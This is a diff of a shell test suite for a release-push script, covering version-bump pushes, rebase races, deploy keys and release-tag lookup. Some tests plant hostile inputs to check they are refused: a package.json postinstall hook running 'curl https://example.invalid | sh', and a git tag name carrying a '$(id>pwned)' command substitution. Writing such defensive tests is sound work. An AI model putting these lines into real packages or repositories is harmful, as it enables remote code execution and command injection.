-check "error says HEAD has no parent" "$(contains "$out" '^::error::HEAD [0-9a-f]* has 0 parents; the version-bump commit has one\.')"
-check "no bare git fatal reaches the log" "$(is "$(contains "$out" '^fatal: ')" false)"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "job summary says the same" "$(contains "$(cat "$work/c2f/summary.md" 2>/dev/null)" 'has 0 parents.*The release itself succeeded.*only this version-bump push to main is outstanding')"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2f")" 1.0.0)"
-check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2f")" seed)"
-
-echo
-echo "Case 2g: the doctored manifest-only commit of 2c on a stale branch is refused before any rebase"
-# main moved on after the checkout, so the commit's parent is an older main
-# commit. The content checks run against that parent before the rebase that
-# would carry the commit onto main's tip, so it is refused where it stands.
-setup "$work/c2g"
-change "$work/c2g/a" src/guard.js "feat: guard"
-git -C "$work/c2g/a" push -q origin main
-record_hook "$work/c2g/origin.git"
-tip=$(git -C "$work/c2g/origin.git" rev-parse main)
-seed=$(git -C "$work/c2g/b" rev-parse HEAD)
-jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2g/b/packages/pkg/package.json" > "$work/c2g/b/tmp.json" \
-  && mv "$work/c2g/b/tmp.json" "$work/c2g/b/packages/pkg/package.json"
-git -C "$work/c2g/b" add packages/pkg/package.json
-git -C "$work/c2g/b" commit -q -m "feat: a release the author bumped"
-check "the commit's parent is the seed, which main has moved past" "$([ "$(git -C "$work/c2g/b" rev-parse HEAD^)" = "$seed" ] && [ "$seed" != "$tip" ] && echo true || echo false)"
-push_main "$work/c2g/b" 1.0.1 "$work/c2g/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error says the manifest differs from its parent's in more than the version" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\. push-main pushes the one version-bump commit")"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "job summary says the same" "$(contains "$(cat "$work/c2g/summary.md" 2>/dev/null)" "differs from its parent's in more than \.version = 1\.0\.1.*The release itself succeeded.*only this version-bump push to main is outstanding")"
-check "the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
-check "no rebase was started" "$(not_rebasing "$work/c2g/b")"
-check "HEAD still sits on the seed, not rebased onto main's tip" "$(is "$(git -C "$work/c2g/b" rev-parse HEAD^)" "$seed")"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main's tip is still main's own" "$(is "$(git -C "$work/c2g/origin.git" rev-parse main)" "$tip")"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2g")" 1.0.0)"
-
-# The same commit when main already holds the version: the rebase path would
-# drop it whole with the superseded-version notice, so the checks must refuse
-# it before that exit.
-setup "$work/c2g-held"
-bump "$work/c2g-held/a" 1.0.1
-git -C "$work/c2g-held/a" push -q origin main
-record_hook "$work/c2g-held/origin.git"
-tip=$(git -C "$work/c2g-held/origin.git" rev-parse main)
-jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2g-held/b/packages/pkg/package.json" > "$work/c2g-held/b/tmp.json" \
-  && mv "$work/c2g-held/b/tmp.json" "$work/c2g-held/b/packages/pkg/package.json"
-git -C "$work/c2g-held/b" add packages/pkg/package.json
-git -C "$work/c2g-held/b" commit -q -m "feat: a release the author bumped"
-push_main "$work/c2g-held/b" 1.0.1 "$work/c2g-held/summary.md"
-check "main already at the version: push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "main already at the version: error says the manifest differs from its parent's" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\.")"
-check "main already at the version: no superseded-version notice, the commit is refused, not dropped" "$(is "$(contains "$out" '::notice title=Version bump not pushed')" false)"
-check "main already at the version: the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
-check "main already at the version: no rebase was started" "$(not_rebasing "$work/c2g-held/b")"
-check "main already at the version: nothing was pushed" "$(is "$seen" "")"
-check "main already at the version: origin/main's tip is still a's bump" "$(is "$(git -C "$work/c2g-held/origin.git" rev-parse main)" "$tip")"
-
-echo
-echo "Case 3: five rejections fail, saying the release succeeded and only the push is outstanding"
-setup "$work/c3"
-printf '#!/bin/sh\necho "rejected by test hook" >&2\nexit 1\n' > "$work/c3/origin.git/hooks/pre-receive"
-chmod +x "$work/c3/origin.git/hooks/pre-receive"
-bump "$work/c3/b" 1.0.1
-push_main "$work/c3/b" 1.0.1 "$work/c3/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "push was attempted exactly five times" "$(is "$(printf '%s\n' "$out" | grep -c 'rejected by test hook')" 5)"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "error says only the version-bump push is outstanding" "$(contains "$out" 'only this version-bump push to main is outstanding')"
-check "job summary says the same" "$(contains "$(cat "$work/c3/summary.md" 2>/dev/null)" 'The release itself succeeded.*only this version-bump push to main is outstanding')"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c3")" 1.0.0)"
-
-echo
-echo "Case 4: a release of another package racing in still rebases cleanly"
-setup "$work/c4"
-mkdir -p "$work/c4/a/packages/other"
-printf '{\n  "name": "other",\n  "version": "2.0.1"\n}\n' > "$work/c4/a/packages/other/package.json"
-git -C "$work/c4/a" add -A
-git -C "$work/c4/a" commit -q -m "chore: release other v2.0.1 [skip ci]"
-git -C "$work/c4/a" push -q origin main
-bump "$work/c4/b" 1.0.1
-push_main "$work/c4/b" 1.0.1
-check "push-main exits 0" "$(is "$rc" 0)"
-check "origin/main holds the bump" "$(is "$(origin_version "$work/c4")" 1.0.1)"
-check "origin/main has both release commits" "$(is "$(release_commits "$work/c4")" 2)"
-
-echo
-echo "Case 5: an unreachable origin fails through the same message"
-setup "$work/c5"
-bump "$work/c5/b" 1.0.1
-# The GitHub URL rewritten to a path that does not exist.
-push_main "$work/c5/b" 1.0.1 "$work/c5/summary.md" GIT_CONFIG_KEY_0="url.$work/c5/nowhere.git.insteadOf"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error names the fetch" "$(contains "$out" '^::error::Fetching main from origin failed on attempt 1\.')"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "job summary says the same" "$(contains "$(cat "$work/c5/summary.md" 2>/dev/null)" 'The release itself succeeded.*only this version-bump push to main is outstanding')"
-check "clone is not left mid-rebase" "$(not_rebasing "$work/c5/b")"
-
-echo
-echo "Case 6: the manifest deleted on main is a real divergence, not resolved"
-setup "$work/c6"
-git -C "$work/c6/a" rm -q -r packages/pkg
-git -C "$work/c6/a" commit -q -m "a: remove pkg"
-git -C "$work/c6/a" push -q origin main
-bump "$work/c6/b" 1.0.1
-push_main "$work/c6/b" 1.0.1
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error names the manifest as the conflict" "$(contains "$out" '^::error::.*conflicts in: packages/pkg/package\.json\.')"
-check "rebase was aborted" "$(not_rebasing "$work/c6/b")"
-check "clone's manifest is intact, not truncated" "$(is "$(jq -r .version "$work/c6/b/packages/pkg/package.json")" 1.0.1)"
-check "origin/main is untouched" "$(is "$(origin_tip_subject "$work/c6")" "a: remove pkg")"
-
-echo
-echo "Case 7: a re-run whose first attempt already landed its bump pushes nothing"
-setup "$work/c7"
-bump "$work/c7/a" 1.0.1
-git -C "$work/c7/a" push -q origin main
-# The re-run recommits the same bump at a later time, so it is a commit of its own.
-GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" bump "$work/c7/b" 1.0.1
-check "the re-run's bump is a different commit from main's" "$([ "$(git -C "$work/c7/b" rev-parse HEAD)" != "$(git -C "$work/c7/origin.git" rev-parse main)" ] && echo true || echo false)"
-push_main "$work/c7/b" 1.0.1 "$work/c7/summary.md"
-check "push-main exits 0" "$(is "$rc" 0)"
-check "notice says main already holds the version" "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/pkg/package.json and bun\.lock already hold v1\.0\.1")"
-check "origin/main holds the version" "$(is "$(origin_version "$work/c7")" 1.0.1)"
-check "origin/main has one bump commit, not two" "$(is "$(release_commits "$work/c7")" 1)"
-check "clone is not left mid-rebase" "$(not_rebasing "$work/c7/b")"
-
-echo
-echo "Case 8: a re-run after a later release of the package landed never lowers main's version"
-setup "$work/c8"
-bump "$work/c8/a" 1.0.2
-git -C "$work/c8/a" push -q origin main
-bump "$work/c8/b" 1.0.1
-push_main "$work/c8/b" 1.0.1 "$work/c8/summary.md"
-check "push-main exits 0" "$(is "$rc" 0)"
-check "notice names the later release" "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/pkg/package.json holds v1\.0\.2, a later release than v1\.0\.1")"
-check "job summary says the bump was not pushed" "$(contains "$(cat "$work/c8/summary.md" 2>/dev/null)" 'Version bump for packages/pkg v1.0.1 not pushed')"
-check "origin/main keeps the later version" "$(is "$(origin_version "$work/c8")" 1.0.2)"
-check "origin/main has only the later release's bump commit" "$(is "$(release_commits "$work/c8")" 1)"
-check "clone is not left mid-rebase" "$(not_rebasing "$work/c8/b")"
-
-echo
-echo "Case 8b: push-main pushes through the deploy key and leaves none behind"
-setup "$work/c8b"
-record_hook "$work/c8b/origin.git"
-bump "$work/c8b/b" 1.0.1
-push_main "$work/c8b/b" 1.0.1
-check "pushes: exits 0" "$(is "$rc" 0)"
-check "pushes: origin/main holds the bump" "$(is "$(origin_version "$work/c8b")" 1.0.1)"
-check "pushes: the key and the pinned host keys were owner-only while the push ran" \
-  "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
-check "pushes: nothing is left in TMPDIR" "$(is "$left" 0)"
-setup "$work/c8c"
-record_hook "$work/c8c/origin.git"
-bump "$work/c8c/b" 1.0.1
-push_main "$work/c8c/b" 1.0.1 "" PUSH_REJECT=1
-check "five rejections: exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "five rejections: says the push race was lost 5 times" "$(contains "$out" '^::error::.*lost the push race to main 5 times\.')"
-check "five rejections: the key and the pinned host keys were owner-only while the pushes ran" \
-  "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
-check "five rejections: nothing is left in TMPDIR" "$(is "$left" 0)"
-check "five rejections: origin/main manifest is untouched" "$(is "$(origin_version "$work/c8c")" 1.0.0)"
-setup "$work/c8d"
-bump "$work/c8d/b" 1.0.1
-push_main "$work/c8d/b" 1.0.1 "$work/c8d/summary.md" DEPLOY_KEY=
-check "no DEPLOY_KEY: exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "no DEPLOY_KEY: the error names it and says the release itself succeeded" \
-  "$(is "$(contains "$out" '^::error::.*DEPLOY_KEY')|$(contains "$out" 'The release itself succeeded')" 'true|true')"
-check "no DEPLOY_KEY: the job summary says the same" \
-  "$(contains "$(cat "$work/c8d/summary.md" 2>/dev/null)" 'DEPLOY_KEY.*The release itself succeeded')"
-check "no DEPLOY_KEY: origin/main is untouched" "$(is "$(origin_version "$work/c8d")" 1.0.0)"
-check "no DEPLOY_KEY: nothing is made in TMPDIR" "$(is "$left" 0)"
-push_main "$work/c8d/b" 1.0.1 "$work/c8d/summary.md" GITHUB_REPOSITORY=
-check "no GITHUB_REPOSITORY: exits non-zero, naming it, and says the release itself succeeded" \
-  "$([ "$rc" != 0 ] && is "$(contains "$out" '^::error::GITHUB_REPOSITORY.*The release itself succeeded')|$left" 'true|0' || echo false)"
-# HEAD:refs/heads/main serves a detached HEAD and a branch alike (a release job
-# may check out either); the pre-push checks (cases 2 to 2f) are what keep
-# everything but the exact bump off main.
-setup "$work/c8e"
-git -C "$work/c8e/b" checkout -q --detach
-bump "$work/c8e/b" 1.0.1
-push_main "$work/c8e/b" 1.0.1
-check "a detached HEAD: exits 0" "$(is "$rc" 0)"
-check "a detached HEAD: origin/main holds the bump" "$(is "$(origin_version "$work/c8e")" 1.0.1)"
-check "a detached HEAD: origin/main's tip is the bump commit" \
-  "$(is "$(git -C "$work/c8e/origin.git" rev-parse main)" "$(git -C "$work/c8e/b" rev-parse HEAD)")"
-# The manifest already held the version, so `tag` committed nothing and HEAD is main's tip.
-setup "$work/c8f"
-record_hook "$work/c8f/origin.git"
-push_main "$work/c8f/b" 1.0.0
-check "HEAD already on main: exits 0" "$(is "$rc" 0)"
-check "HEAD already on main: says there is nothing to push" "$(contains "$out" '^Nothing to push: main already holds this checkout$')"
-check "HEAD already on main: nothing was pushed" "$(is "$seen" "")"
-check "HEAD already on main: origin/main is unchanged" \
-  "$(is "$(git -C "$work/c8f/origin.git" rev-parse main)" "$(git -C "$work/c8f/b" rev-parse HEAD)")"
-
-echo
 echo "Case 9: tagged finds the tag an earlier attempt pushed for this checkout, and only that"
 setup "$work/c9"
 clone="$work/c9/a"
 seed=$(git -C "$clone" rev-parse HEAD)
-tagged "$clone" pkg-v packages/pkg
+tagged "$clone" pkg-v
 check "no tag: exits 0" "$(is "$rc" 0)"
 check "no tag: prints nothing" "$(is "$out" "")"
-# What one release run leaves: its bump commit, a child of the checkout, tagged.
-bump "$clone" 1.0.1
+# What one release run leaves: its tag on the commit it released, which is the commit the run
+# checked out, since `tag` tags $GITHUB_SHA and commits nothing.
 git -C "$clone" tag pkg-v1.0.1
-# Another package's release from the same checkout: a sibling bump, tagged with its own prefix.
-git -C "$clone" checkout -q --detach "$seed"
-mkdir -p "$clone/packages/other"
-printf '{\n  "name": "other",\n  "version": "2.0.1"\n}\n' > "$clone/packages/other/package.json"
-git -C "$clone" add -A
-git -C "$clone" commit -q -m "chore: release other v2.0.1 [skip ci]"
-git -C "$clone" tag other-v2.0.1
-git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" pkg-v packages/pkg
-check "the tag on HEAD's bump commit: printed" "$(is "$out" pkg-v1.0.1)"
 tagged "$clone" pkg-v
-check "without a package dir, a tag on HEAD's bump commit is not this checkout's" "$(is "$rc $out" "0 ")"
-tagged "$clone" other-v packages/other
+check "the tag on HEAD: printed" "$(is "$rc $out" "0 pkg-v1.0.1")"
+# Another package's release from the same commit: its own prefix's tag, on that same commit.
+git -C "$clone" tag other-v2.0.1
+tagged "$clone" other-v
 check "each prefix finds its own package's tag" "$(is "$out" other-v2.0.1)"
-# A later release: main moves past the first bump, and the next run tags its own bump.
-git -C "$clone" checkout -q --detach pkg-v1.0.1
-printf 'later\n' > "$clone/README.md"
-git -C "$clone" commit -q -am "fix: later change"
-later=$(git -C "$clone" rev-parse HEAD)
-bump "$clone" 1.0.2
+tagged "$clone" pkg-v
+check "another package's tag on the same commit changes nothing" "$(is "$out" pkg-v1.0.1)"
+# Two releases of one package on one commit: the newer version is this checkout's.
 git -C "$clone" tag pkg-v1.0.2
+tagged "$clone" pkg-v
+check "two tags of the prefix on HEAD: the newer version" "$(is "$out" pkg-v1.0.2)"
+git -C "$clone" tag -d pkg-v1.0.2 >/dev/null
+# A later release: the next run tags its own commit, which is no tag of this one.
+change "$clone" packages/pkg/index.js "fix: later change"
+later=$(git -C "$clone" rev-parse HEAD)
+git -C "$clone" tag pkg-v1.1.0
 git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" pkg-v packages/pkg
+tagged "$clone" pkg-v
 check "a later release on a descendant is not this checkout's" "$(is "$out" pkg-v1.0.1)"
 git -C "$clone" checkout -q --detach "$later"
-tagged "$clone" pkg-v packages/pkg
-check "the later run's checkout finds its own tag" "$(is "$out" pkg-v1.0.2)"
-# A tag on a child of HEAD that changes more than the manifest is not a bump commit.
+tagged "$clone" pkg-v
+check "the later run's checkout finds its own tag" "$(is "$out" pkg-v1.1.0)"
+# No release commits anything any more, so a tagged child of HEAD is another commit's release,
+# whatever it changes: the manifest and the lockfile alone, the shape the bump commit had, counts
+# no more than any other child.
 git -C "$clone" checkout -q --detach "$seed"
-printf 'not a bump\n' > "$clone/README.md"
-jq '.version = "1.0.9"' "$clone/packages/pkg/package.json" > "$clone/tmp.json" \
+jq '.version = "1.0.3"' "$clone/packages/pkg/package.json" > "$clone/tmp.json" \
   && mv "$clone/tmp.json" "$clone/packages/pkg/package.json"
-git -C "$clone" commit -q -am "feat: a child that is not a bump"
-git -C "$clone" tag pkg-v1.0.9
+sed -i '/^    "packages\/pkg": {$/,/^    },$/ s/^      "version": "[^"]*",$/      "version": "1.0.3",/' "$clone/bun.lock"
+git -C "$clone" commit -q -am "chore: release pkg v1.0.3 [skip ci]"
+git -C "$clone" tag pkg-v1.0.3
 git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" pkg-v packages/pkg
-check "a tagged child changing another file is skipped" "$(is "$out" pkg-v1.0.1)"
-# The manifest already held the version, so `tag` tagged HEAD itself.
-git -C "$work/c9/b" tag pkg-v1.0.0
-tagged "$work/c9/b" pkg-v packages/pkg
-check "a tag on HEAD itself: printed" "$(is "$out" pkg-v1.0.0)"
-# A job that tags the commit it checked out (legion, the Envoy listener) passes no package dir.
-tagged "$work/c9/b" pkg-v
-check "without a package dir, a tag on HEAD itself: printed" "$(is "$out" pkg-v1.0.0)"
-# A bump commit of the manifest alone, the shape `tag` made before the lockfile
-# took the version, and one of the lockfile alone, which `tag` makes when the
-# manifest already held the version: each is a bump commit.
-setup "$work/c9b"
-clone="$work/c9b/a"
-seed=$(git -C "$clone" rev-parse HEAD)
-set_version "$clone" 1.0.1
-git -C "$clone" commit -q -am "chore: release pkg v1.0.1 [skip ci]"
-git -C "$clone" tag pkg-v1.0.1
-git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" pkg-v packages/pkg
-check "a tagged child changing the manifest alone: printed" "$(is "$rc $out" "0 pkg-v1.0.1")"
-set_lock_version "$clone" 2.0.1 packages/other
-git -C "$clone" commit -q -am "chore: release other v2.0.1 [skip ci]"
-git -C "$clone" tag other-v2.0.1
-git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" other-v packages/other
-check "a tagged child changing the lockfile alone: printed" "$(is "$rc $out" "0 other-v2.0.1")"
-printf 'not a bump\n' > "$clone/README.md"
-set_lock_version "$clone" 1.0.9
-git -C "$clone" commit -q -am "feat: a child that is not a bump"
-git -C "$clone" tag pkg-v1.0.9
-git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" pkg-v packages/pkg
-check "a tagged child changing the lockfile and another file is skipped" "$(is "$out" pkg-v1.0.1)"
+tagged "$clone" pkg-v
+check "a tag on a child of HEAD that changes the manifest and the lockfile alone is skipped" "$(is "$out" pkg-v1.0.1)"
 
 echo
 echo "Case 10: tagged refuses a release tag whose name is not <prefix>X.Y.Z"
 setup "$work/c10"
 clone="$work/c10/a"
 seed=$(git -C "$clone" rev-parse HEAD)
-bump "$clone" 1.0.1
 # shellcheck disable=SC2016 # literal $(…): git accepts it in a tag name
 git -C "$clone" tag 'pkg-v1.0.1$(id>pwned)'
-git -C "$clone" checkout -q --detach "$seed"
-tagged "$clone" pkg-v packages/pkg
-check "a command substitution on the bump commit: exits 1" "$(is "$rc" 1)"
-check "a command substitution on the bump commit: prints no tag" "$(is "$out" "")"
-check "a command substitution on the bump commit: the error names the tag" "$(contains "$err" '^::error::release-push.sh tagged: pkg-v1\.0\.1.*id.*pwned.*, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$')"
-check "a command substitution on the bump commit: nothing in it ran" "$([ ! -e "$clone/pwned" ] && echo true || echo false)"
+tagged "$clone" pkg-v
+check "a command substitution on HEAD: exits 1" "$(is "$rc" 1)"
+check "a command substitution on HEAD: prints no tag" "$(is "$out" "")"
+check "a command substitution on HEAD: the error names the tag" "$(contains "$err" '^::error::release-push.sh tagged: pkg-v1\.0\.1.*id.*pwned.*, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$')"
+check "a command substitution on HEAD: nothing in it ran" "$([ ! -e "$clone/pwned" ] && echo true || echo false)"
 # shellcheck disable=SC2016 # literal $(…), the tag's name
 git -C "$clone" tag -d 'pkg-v1.0.1$(id>pwned)' >/dev/null
 git -C "$clone" tag pkg-v1.0.0-rc.1
-tagged "$clone" pkg-v packages/pkg
+tagged "$clone" pkg-v
 check "a pre-release on HEAD: exits 1" "$(is "$rc" 1)"
 check "a pre-release on HEAD: prints no tag" "$(is "$out" "")"
 check "a pre-release on HEAD: the error names the tag" "$(contains "$err" '^::error::release-push.sh tagged: pkg-v1\.0\.0-rc\.1, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$')"
@@ -850,14 +301,14 @@ git -C "$clone" tag -d pkg-v1.0.0-rc.1 >/dev/null
 for name in pkg-v1.010.0 pkg-v01.0.0; do
   git -C "$clone" tag "$name"
   tagged "$clone" pkg-v
-  check "a leading zero on HEAD ($name), no package dir: exits 1" "$(is "$rc" 1)"
-  check "a leading zero on HEAD ($name), no package dir: prints no tag" "$(is "$out" "")"
-  check "a leading zero on HEAD ($name), no package dir: the error names the tag" "$(contains "$err" "^::error::release-push.sh tagged: ${name//./\\.}, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$")"
+  check "a leading zero on HEAD ($name): exits 1" "$(is "$rc" 1)"
+  check "a leading zero on HEAD ($name): prints no tag" "$(is "$out" "")"
+  check "a leading zero on HEAD ($name): the error names the tag" "$(contains "$err" "^::error::release-push.sh tagged: ${name//./\\.}, the release tag for this checkout, is not pkg-vX\.Y\.Z; refusing it$")"
   git -C "$clone" tag -d "$name" >/dev/null
 done
 git -C "$clone" tag pkg-v1.0.0
 tagged "$clone" pkg-v
-check "a zero field is plain: pkg-v1.0.0 on HEAD, no package dir, printed" "$(is "$rc $out" "0 pkg-v1.0.0")"
+check "a zero field is plain: pkg-v1.0.0 on HEAD, printed" "$(is "$rc $out" "0 pkg-v1.0.0")"
 git -C "$clone" tag -d pkg-v1.0.0 >/dev/null
 # Git refuses a tag name holding a space or a newline, and ignores a ref file
 # forged with one, so `tagged` is never handed either.
@@ -866,7 +317,7 @@ for name in 'pkg-v1.0.2 x' $'pkg-v1.0.2\nx'; do
   check "git refuses to create the tag $shown" "$(git -C "$clone" tag "$name" 2>/dev/null && echo false || echo true)"
   printf '%s\n' "$seed" > "$clone/.git/refs/tags/$name"
 done
-tagged "$clone" pkg-v packages/pkg
+tagged "$clone" pkg-v
 check "forged refs with a space and a newline: exits 0" "$(is "$rc" 0)"
 check "forged refs with a space and a newline: prints no tag" "$(is "$out" "")"
 check "forged refs with a space and a newline: git ignores both" "$(is "$(printf '%s\n' "$err" | { grep -c '^warning: ignoring ref with broken name refs/tags/pkg-v1\.0\.2' || true; })" 2)"
@@ -912,14 +363,26 @@ version_run "$clone" pkg-v -- packages/pkg/
 check "a tag on HEAD: exits 0" "$(is "$rc" 0)"
 check "a tag on HEAD: prints its version, the tag and skip=false, nothing else" "$(is "$out" "$(outputs 1.0.0 pkg-v1.0.0 false)")"
 check "a tag on HEAD: says it was already pushed" "$(contains "$err" '^Releasing pkg-v1\.0\.0, already pushed for this checkout$')"
-# What one release run leaves (case 9): its bump commit, a child of the checkout, tagged.
-bump "$work/v/b" 1.0.1
-git -C "$work/v/b" tag pkg-v1.0.1
-git -C "$work/v/b" checkout -q --detach "$seed"
-version_run "$work/v/b" pkg-v --package-dir packages/pkg -- packages/pkg/
-check "a tag on HEAD's bump commit, with the package dir: that tag's version" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
-version_run "$work/v/b" pkg-v -- packages/pkg/
-check "the same without the package dir: the newest tag is on a descendant, so nothing is since it" "$(is "$rc $out" "0 $(outputs '' '' true)")"
+# What `tag` leaves a re-run: the release tag on the commit the run released, made by the script
+# under test with $GITHUB_SHA naming that commit.
+vb="$work/v/b"
+vb_sha=$(git -C "$vb" rev-parse HEAD)
+set +e
+(cd "$vb" && GITHUB_SHA="$vb_sha" "$release_push" tag 1.0.1 pkg-v1.0.1) >/dev/null 2>&1
+rc=$?
+set -e
+check "tag on this checkout: exits 0" "$(is "$rc" 0)"
+check "tag on this checkout: committed nothing, leaving the work tree as it was" \
+  "$(is "$(git -C "$vb" rev-parse HEAD)|$(git -C "$vb" status --porcelain)" "$vb_sha|")"
+version_run "$vb" pkg-v -- packages/pkg/
+check "the tag tag made on HEAD: its version, the tag and skip=false" "$(is "$rc $out" "0 $(outputs 1.0.1 pkg-v1.0.1 false)")"
+check "the tag tag made on HEAD: says it was already pushed" "$(contains "$err" '^Releasing pkg-v1\.0\.1, already pushed for this checkout$')"
+# A commit after that release: the next version comes from the tag alone, since no commit of the
+# release itself sits on the branch to read a version from.
+change "$vb" packages/pkg/index.js "fix: a bug after the release"
+version_run "$vb" pkg-v -- packages/pkg/
+check "a commit after the tag: the next version from the tag alone" "$(is "$rc $out" "0 $(outputs 1.0.2 pkg-v1.0.2 false)")"
+check "a commit after the tag: logs the bump from that tag" "$(contains "$err" '^Bumping pkg-v1\.0\.1 -> pkg-v1\.0\.2$')"
 # Commits since the tag, each kind from the tagged commit.
 change "$clone" packages/pkg/index.js "feat: add an export"
 feat=$(git -C "$clone" rev-parse HEAD)
@@ -960,6 +423,18 @@ check "no tag, --first-npm: asked npm for the package's version" "$(is "$npm_cal
 check "no tag, --first-npm: logs the bump from npm's version" "$(contains "$err" '^Bumping v2\.3\.4 -> pkg-v2\.3\.5$')"
 NPM_TEST_FAIL=1 version_run "$work/v/c" pkg-v --first-npm @example/pkg -- packages/pkg/
 check "no tag, npm has no such package: starts from 0.0.0" "$(is "$rc $out" "0 $(outputs 0.0.1 pkg-v0.0.1 false)")"
+# @sjawhar/claude-envoy's own case, which release.yaml's claude_envoy_build runs: npm carries a
+# 0.0.0 placeholder of the package, so npm answers and the fallback above is never reached, and
+# no claude-envoy-v tag exists yet. The first release comes from the whole history of the paths,
+# not from the newest commit alone: the fix: above and the feat: below are both in the range, so
+# it bumps the minor rather than failing for the missing tag or skipping for an empty range.
+change "$work/v/c" packages/pkg/index.js "feat: an export before the first release"
+NPM_TEST_VERSION=0.0.0 version_run "$work/v/c" pkg-v --first-npm @example/pkg -- packages/pkg/
+check "no tag, npm's 0.0.0 placeholder: exits 0" "$(is "$rc" 0)"
+check "no tag, npm's 0.0.0 placeholder: the first release reads the whole history" \
+  "$(is "$out" "$(outputs 0.1.0 pkg-v0.1.0 false)")"
+check "no tag, npm's 0.0.0 placeholder: asked npm for the package's version" "$(is "$npm_calls" '[view][@example/pkg][version]')"
+check "no tag, npm's 0.0.0 placeholder: logs the bump from the placeholder" "$(contains "$err" '^Bumping v0\.0\.0 -> pkg-v0\.1\.0$')"
 version_run "$work/v/c" pkg-v -- packages/pkg/
 check "no tag, no --first-npm: exits 1 printing nothing" "$(is "$rc|$out" "1|")"
 check "no tag, no --first-npm: the error says a release line starts from a tag" \
@@ -1058,96 +533,112 @@ version_run "$clone" pkg-v --bogus -- packages/pkg/
 check "an unknown option: exits 2 printing nothing, with the usage" "$(is "$rc|$out|$(contains "$err" '^::error::release-push.sh version: unknown option --bogus; usage: release-push.sh version ')" "2||true")"
 
 echo
-echo "Case 10c: tag commits the bump and tags it locally, pushing nothing"
-# tag_run <clone> <version> <tag> [<package-dir> <name>]: sets the manifest's
-# version as the workflow does before `tag`, then runs `release-push.sh tag`
-# from <clone>; <package-dir> and <name> default to packages/pkg and pkg.
-# Leaves its exit code in rc and its combined output in out.
+echo "Case 10c: tag makes the release tag on \$GITHUB_SHA, committing nothing and pushing nothing"
+# tag_run <clone> <version> <tag> [<sha>]: runs `release-push.sh tag <version> <tag>` from <clone>
+# with $GITHUB_SHA naming <clone>'s HEAD, as the publish job runs it from the run's commit, or
+# naming <sha> when one is given (the empty string for a $GITHUB_SHA set to nothing). Leaves its
+# exit code in rc and its combined output in out.
 tag_run() {
-  local clone=$1 v=$2 tag=$3 package_dir=${4:-packages/pkg} name=${5:-pkg}
-  set_version "$clone" "$v" "$package_dir"
+  local clone=$1 v=$2 tag=$3 sha=${4-}
+  [ $# -ge 4 ] || sha=$(git -C "$clone" rev-parse HEAD)
   set +e
-  out=$(cd "$clone" && "$release_push" tag "$package_dir" "chore: release $name v$v [skip ci]" "$tag" 2>&1)
+  out=$(cd "$clone" && env GITHUB_SHA="$sha" "$release_push" tag "$v" "$tag" 2>&1)
   rc=$?
   set -e
 }
+# state <clone>: what `tag` leaves as it was — HEAD, how many commits the branch holds, the blob
+# of every file under packages/ and of bun.lock, and whatever the work tree and index carry.
+state() {
+  git -C "$1" rev-parse HEAD
+  git -C "$1" rev-list --count HEAD
+  git -C "$1" ls-tree -r HEAD -- packages bun.lock
+  git -C "$1" status --porcelain
+}
 setup "$work/t"
 clone="$work/t/a"
+mkdir -p "$clone/packages/other"
+printf '{\n  "name": "other",\n  "version": "2.0.0"\n}\n' > "$clone/packages/other/package.json"
+git -C "$clone" add -A
+git -C "$clone" commit -q -m "feat: add other"
+git -C "$clone" push -q origin main
+run=$(git -C "$clone" rev-parse HEAD)
+before=$(state "$clone")
 tag_run "$clone" 1.0.1 pkg-v1.0.1
 check "tags: exits 0" "$(is "$rc" 0)"
-check "tags: the clone has the bump commit" "$(is "$(git -C "$clone" log -1 --format=%s)" "chore: release pkg v1.0.1 [skip ci]")"
-check "tags: the tag is on it" "$(is "$(git -C "$clone" rev-parse 'pkg-v1.0.1^{commit}')" "$(git -C "$clone" rev-parse HEAD)")"
+check "tags: the tag names \$GITHUB_SHA" "$(is "$(git -C "$clone" rev-list -n 1 pkg-v1.0.1)" "$run")"
+check "tags: no commit is added and the manifests and the lockfile are untouched" "$(is "$(state "$clone")" "$before")"
